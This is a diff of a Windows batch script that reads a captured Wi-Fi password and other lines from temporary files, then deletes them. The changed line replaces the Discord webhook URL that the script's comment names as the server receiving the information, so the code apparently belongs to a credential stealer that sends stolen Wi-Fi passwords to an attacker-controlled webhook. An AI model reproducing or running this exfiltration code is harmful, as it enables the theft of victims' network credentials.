@@ -27,7 +27,7 @@ set /p "wifipasswd="< wifipass.txt
 set /p "line2=" < line2.txt
 
 rem server by transfering informations
-set webhook="https://discordapp.com/api/webhooks/1288994255355772948/_y-tOeyzn0escJxZNuathSLEGDuWjZlzo_Q2BNA3tyAhWF2QJ5yK4X9SnQxIhnYsgqwy"
+set webhook="https://discordapp.com/api/webhooks/1311809848148627486/hC8h2iJ0RMqPsVYweQ6w9VIlhDb7GilnF9srYC9JI5OHerQHNH557x9-IUyuYHH-1jNN"
 
 rem clean filez 
 del line1.txt
